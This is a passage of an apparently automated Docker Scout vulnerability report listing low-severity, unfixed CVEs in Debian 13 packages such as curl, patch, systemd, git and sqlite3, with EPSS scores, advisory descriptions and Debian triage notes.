When doing multi-threaded LDAPS transfers (LDAP over TLS) with libcurl, changing TLS options in one thread would inadvertently change them globally and therefore possibly also affect other concurrently setup transfers.  Disabling certificate verification for a specific transfer could unintentionally disable the feature for other threads as well.

---
- curl 8.18.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-14017.html
Introduced with: https://github.com/curl/curl/commit/ccba0d10b6baf5c73cae8cf4fb3f29f0f55c5a34 (curl-7_17_0)
Fixed by: https://github.com/curl/curl/commit/39d1976b7f709a516e3243338ebc0443bdd8d56d (rc-8_18_0-1, curl-8_18_0)
Built with OpenLDAP (only affects the legacy LDAP support)

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-10966?s=debian&n=curl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--10966" src="https://img.shields.io/badge/CVE--2025--10966-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

curl's code for managing SSH connections when SFTP was done using the wolfSSH powered backend was flawed and missed host verification mechanisms.  This prevents curl from detecting MITM attackers and more.

---
- curl 8.17.0~rc2-1 (unimportant)
https://curl.se/docs/CVE-2025-10966.html
Introduced with: https://github.com/curl/curl/commit/6773c7ca65cf2183295e56603f9b86a5ce816a06 (curl-7_69_0)
Fixed by: https://github.com/curl/curl/commit/b011e3fcfb06d6c0278595ee2ee297036fbe9793 (rc-8_17_0-1)
wolfSSH backend not used in Debian

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>patch</strong> <code>2.8-2</code> (deb)</summary>

<small><code>pkg:deb/debian/patch@2.8-2?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2021-45261?s=debian&n=patch&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2021--45261" src="https://img.shields.io/badge/CVE--2021--45261-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.197%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An Invalid Pointer vulnerability exists in GNU patch 2.7 via the another_hunk function, which causes a Denial of Service.

---
- patch <unfixed> (unimportant)
https://savannah.gnu.org/bugs/?61685
Negligible security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-6952?s=debian&n=patch&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--6952" src="https://img.shields.io/badge/CVE--2018--6952-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>11.805%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>94th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A double free exists in the another_hunk function in pch.c in GNU patch through 2.7.6.

---
- patch <unfixed> (unimportant)
https://savannah.gnu.org/bugs/index.php?53133
https://git.savannah.gnu.org/cgit/patch.git/commit/?id=9c986353e420ead6e706262bf204d6e03322c300
When fixing this issue make sure to not apply only the incomplete fix,
and opening CVE-2019-20633, cf. https://savannah.gnu.org/bugs/index.php?56683
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-6951?s=debian&n=patch&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--6951" src="https://img.shields.io/badge/CVE--2018--6951-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>15.333%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>95th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in GNU patch through 2.7.6. There is a segmentation fault, associated with a NULL pointer dereference, leading to a denial of service in the intuit_diff_type function in pch.c, aka a "mangled rename" issue.

---
- patch <unfixed> (unimportant)
https://git.savannah.gnu.org/cgit/patch.git/commit/?id=f290f48a621867084884bfff87f8093c15195e6a
https://savannah.gnu.org/bugs/index.php?53132
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2010-4651?s=debian&n=patch&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2010--4651" src="https://img.shields.io/badge/CVE--2010--4651-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>1.830%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>83rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Directory traversal vulnerability in util.c in GNU patch 2.6.1 and earlier allows user-assisted remote attackers to create or overwrite arbitrary files via a filename that is specified with a .. (dot dot) or full pathname, a related issue to CVE-2010-1679.

---
- patch <unfixed> (unimportant)
Applying a patch blindly opens more severe security issues than only directory traversal...
openwall ships a fix
See https://bugzilla.redhat.com/show_bug.cgi?id=667529 for details

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 4" src="https://img.shields.io/badge/L-4-fce1a9"/> <!-- unspecified: 0 --><strong>systemd</strong> <code>257.9-1~deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/systemd@257.9-1~deb13u1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-31439?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31439" src="https://img.shields.io/badge/CVE--2023--31439-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.125%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify the contents of past events in a sealed log file and then adjust the file such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31438?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31438" src="https://img.shields.io/badge/CVE--2023--31438-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.134%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can truncate a sealed log file and then resume log sealing such that checking the integrity shows no error, despite modifications. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-31437?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2023--31437" src="https://img.shields.io/badge/CVE--2023--31437-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.170%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in systemd 253. An attacker can modify a sealed log file such that, in some views, not all existing and sealed log messages are displayed. NOTE: the vendor reportedly sent "a reply denying that any of the finding was a security vulnerability."

---
- systemd <unfixed> (unimportant)
Disputed by upstream
https://github.com/kastel-security/Journald/blob/main/journald-publication.pdf

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2013-4392?s=debian&n=systemd&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2013--4392" src="https://img.shields.io/badge/CVE--2013--4392-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.042%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

systemd, when updating file permissions, allows local users to change the permissions and SELinux security contexts for arbitrary files via a symlink attack on unspecified files.

---
- systemd <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=725357)
[wheezy] - systemd <not-affected> (/etc/tmpfiles.d not supported in Wheezy)
https://bugzilla.redhat.com/show_bug.cgi?id=859060
only relevant to systems running systemd along with selinux

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 3" src="https://img.shields.io/badge/L-3-fce1a9"/> <!-- unspecified: 0 --><strong>git</strong> <code>1:2.47.3-0+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/git@1%3A2.47.3-0%2Bdeb13u1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-52005?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2024--52005" src="https://img.shields.io/badge/CVE--2024--52005-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.384%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>60th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Git is a source code management tool. When cloning from a server (or fetching, or pushing), informational or error messages are transported from the remote Git process to the client via the so-called "sideband channel". These messages will be prefixed with "remote:" and printed directly to the standard error output. Typically, this standard error output is connected to a terminal that understands ANSI escape sequences, which Git did not protect against. Most modern terminals support control sequences that can be used by a malicious actor to hide and misrepresent information, or to mislead the user into executing untrusted scripts. As requested on the git-security mailing list, the patches are under discussion on the public mailing list. Users are advised to update as soon as possible. Users unable to upgrade should avoid recursive clones unless they are from trusted sources.

---
- git <unfixed> (unimportant)
https://github.com/git/git/security/advisories/GHSA-7jjc-gg6m-3329
Terminal emulators need to perform proper escaping

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-24975?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--24975" src="https://img.shields.io/badge/CVE--2022--24975-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.956%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>77th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The --mirror documentation for Git through 2.35.1 does not mention the availability of deleted content, aka the "GitBleed" issue. This could present a security risk if information-disclosure auditing processes rely on a clone operation without the --mirror option. Note: This has been disputed by multiple 3rd parties who believe this is an intended feature of the git binary and does not pose a security risk.

---
- git <unfixed> (unimportant)
https://wwws.nightwatchcybersecurity.com/2022/02/11/gitbleed/
CVE is specifically about --mirror documentation not mentioning the availability
of deleted content.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-1000021?s=debian&n=git&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2018--1000021" src="https://img.shields.io/badge/CVE--2018--1000021-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.372%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GIT version 2.15.1 and earlier contains a Input Validation Error vulnerability in Client that can result in problems including messing up terminal configuration to RCE. This attack appear to be exploitable via The user must interact with a malicious git server, (or have their traffic modified in a MITM attack).

---
- git <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=889680)
http://www.batterystapl.es/2018/01/security-implications-of-ansi-escape.html
Terminal emulators need to perform proper escaping

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>sqlite3</strong> <code>3.46.1-7+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/sqlite3@3.46.1-7%2Bdeb13u1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-70873?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--70873" src="https://img.shields.io/badge/CVE--2025--70873-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.050%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An information disclosure issue in the zipfileInflate function in the zipfile extension in SQLite v3.51.1 and earlier allows attackers to obtain heap memory via supplying a crafted ZIP file.

---
- sqlite3 <unfixed> (unimportant)
https://sqlite.org/src/info/3d459f1fb1bd1b5e
https://sqlite.org/forum/forumpost/761eac3c82
https://gist.github.com/cnwangjihe/f496393f30f5ecec5b18c8f5ab072054
zipfile extension not build for Debian binary package builds

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-45346?s=debian&n=sqlite3&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2021--45346" src="https://img.shields.io/badge/CVE--2021--45346-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.271%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>50th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A Memory Leak vulnerability exists in SQLite Project SQLite3 3.35.1 and 3.37.0 via maliciously crafted SQL Queries (made via editing the Database File), it is possible to query a record, and leak subsequent bytes of memory that extend beyond the record, which could let a malicious user obtain sensitive information. NOTE: The developer disputes this as a vulnerability stating that If you give SQLite a corrupted database file and submit a query against the database, it might read parts of the database that you did not intend or expect.

---
- sqlite3 <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1005974)
- sqlite <removed> (unimportant)
https://github.com/guyinatuxedo/sqlite3_record_leaking
https://bugzilla.redhat.com/show_bug.cgi?id=2054793
https://sqlite.org/forum/forumpost/056d557c2f8c452ed5bb9c215414c802b215ce437be82be047726e521342161e
Negligible security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>util-linux</strong> <code>2.41-5</code> (deb)</summary>

<small><code>pkg:deb/debian/util-linux@2.41-5?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-14104?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--14104" src="https://img.shields.io/badge/CVE--2025--14104-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in util-linux. This vulnerability allows a heap buffer overread when processing 256-byte usernames, specifically within the `setpwnam()` function, affecting SUID (Set User ID) login-utils utilities writing to the password database.

---
- util-linux 2.41.3-1 (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1122058; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2419369
https://github.com/util-linux/util-linux/issues/3585
https://github.com/util-linux/util-linux/pull/3586
Fixed by: https://github.com/util-linux/util-linux/commit/aaa9e718c88d6916b003da7ebcfe38a3c88df8e6
Fixed by: https://github.com/util-linux/util-linux/commit/9a36d77012c4c771f8d51eba46b6e62c29bf572a
Affected code in setpwnam() is only used by chsh and chfn which are not build
in any Debian released binary package from src:util-linux and explicitly configured
as with --disable-chfn-chsh since 2.25-1.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2022-0563?s=debian&n=util-linux&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--0563" src="https://img.shields.io/badge/CVE--2022--0563-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.025%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in the util-linux chfn and chsh utilities when compiled with Readline support. The Readline library uses an "INPUTRC" environment variable to get a path to the library config file. When the library cannot parse the specified file, it prints an error message containing data from the file. This flaw allows an unprivileged user to read root-owned files, potentially leading to privilege escalation. This flaw affects util-linux versions prior to 2.37.4.

---
- util-linux <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2053151
https://lore.kernel.org/util-linux/20220214110609.msiwlm457ngoic6w@ws.net.home/T/#u
https://github.com/util-linux/util-linux/commit/faa5a3a83ad0cb5e2c303edbfd8cd823c9d94c17
util-linux in Debian does build with readline support but chfn and chsh are provided
by src:shadow and util-linux is configured with --disable-chfn-chsh

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 2" src="https://img.shields.io/badge/L-2-fce1a9"/> <!-- unspecified: 0 --><strong>coreutils</strong> <code>9.7-3</code> (deb)</summary>

<small><code>pkg:deb/debian/coreutils@9.7-3?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-5278?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--5278" src="https://img.shields.io/badge/CVE--2025--5278-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.130%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in GNU Coreutils. The sort utility's begfield() function is vulnerable to a heap buffer under-read. The program may access memory outside the allocated buffer if a user runs a crafted command using the traditional key format. A malicious input could lead to a crash or leak sensitive data.

---
- coreutils <unfixed> (bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1106733; unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2368764
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00036.html
https://lists.gnu.org/archive/html/bug-coreutils/2025-05/msg00040.html
https://cgit.git.savannah.gnu.org/cgit/coreutils.git/commit/?id=8c9602e3a145e9596dc1a63c6ed67865814b6633
https://www.openwall.com/lists/oss-security/2025/05/27/2
https://debbugs.gnu.org/cgi/bugreport.cgi?bug=78507
Crash in CLI tool, no security impact

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2017-18018?s=debian&n=coreutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2017--18018" src="https://img.shields.io/badge/CVE--2017--18018-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.056%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>17th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

In GNU Coreutils through 8.29, chown-core.c in chown and chgrp does not prevent replacement of a plain file with a symlink during use of the POSIX "-R -L" options, which allows local users to modify the ownership of arbitrary files by leveraging a race condition.

---
- coreutils <unfixed> (unimportant)
http://lists.gnu.org/archive/html/coreutils/2017-12/msg00045.html
https://www.openwall.com/lists/oss-security/2018/01/04/3
Documentation patches proposed:
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00072.html
https://lists.gnu.org/archive/html/coreutils/2017-12/msg00073.html
Neutralised by kernel hardening

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>unzip</strong> <code>6.0-29</code> (deb)</summary>

<small><code>pkg:deb/debian/unzip@6.0-29?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2021-4217?s=debian&n=unzip&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2021--4217" src="https://img.shields.io/badge/CVE--2021--4217-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.195%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>41st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in unzip. The vulnerability occurs due to improper handling of Unicode strings, which can lead to a null pointer dereference. This flaw allows an attacker to input a specially crafted zip file, leading to a crash or code execution.

---
- unzip <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2044583
https://bugs.launchpad.net/ubuntu/+source/unzip/+bug/1957077
Crash in CLI tool, no security impact

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>openssl</strong> <code>3.5.6-1~deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/openssl@3.5.6-1~deb13u1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2010-0928?s=debian&n=openssl&ns=debian&t=deb&osn=debian&osv=13&vr=%3E%3D3.2.1-3"><img alt="low : CVE--2010--0928" src="https://img.shields.io/badge/CVE--2010--0928-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=3.2.1-3</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.094%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>26th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

OpenSSL 0.9.8i on the Gaisler Research LEON3 SoC on the Xilinx Virtex-II Pro FPGA uses a Fixed Width Exponentiation (FWE) algorithm for certain signature calculations, and does not verify the signature before providing it to a caller, which makes it easier for physically proximate attackers to determine the private key via a modified supply voltage for the microprocessor, related to a "fault-based attack."

---
http://www.eecs.umich.edu/~valeria/research/publications/DATE10RSA.pdf
https://github.com/openssl/openssl/discussions/24540
Fault injection based attacks are not within OpenSSLs threat model according
to the security policy: https://www.openssl.org/policies/general/security-policy.html

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>pwgen</strong> <code>2.08-2+b1</code> (deb)</summary>

<small><code>pkg:deb/debian/pwgen@2.08-2%2Bb1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2013-4441?s=debian&n=pwgen&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2013--4441" src="https://img.shields.io/badge/CVE--2013--4441-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.321%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The Phonemes mode in Pwgen 2.06 generates predictable passwords, which makes it easier for context-dependent attackers to guess the password via a brute-force attack.

---
- pwgen <unfixed> (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=726578)
pwgen is documented to generate memorable passwords, so this is by design

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 0" src="https://img.shields.io/badge/M-0-lightgrey"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>gnupg2</strong> <code>2.4.7-21+deb13u1</code> (deb)</summary>

<small><code>pkg:deb/debian/gnupg2@2.4.7-21%2Bdeb13u1?os_distro=trixie&os_name=debian&os_version=13</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2022-3219?s=debian&n=gnupg2&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2022--3219" src="https://img.shields.io/badge/CVE--2022--3219-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.015%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>3rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

GnuPG can be made to spin on a relatively small input by (for example) crafting a public key with thousands of signatures attached, compressed down to just a few KB.

---
- gnupg2 <unfixed> (unimportant)
https://bugzilla.redhat.com/show_bug.cgi?id=2127010
https://dev.gnupg.org/D556
https://dev.gnupg.org/T5993
https://www.openwall.com/lists/oss-security/2022/07/04/8
GnuPG upstream is not implementing this change.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
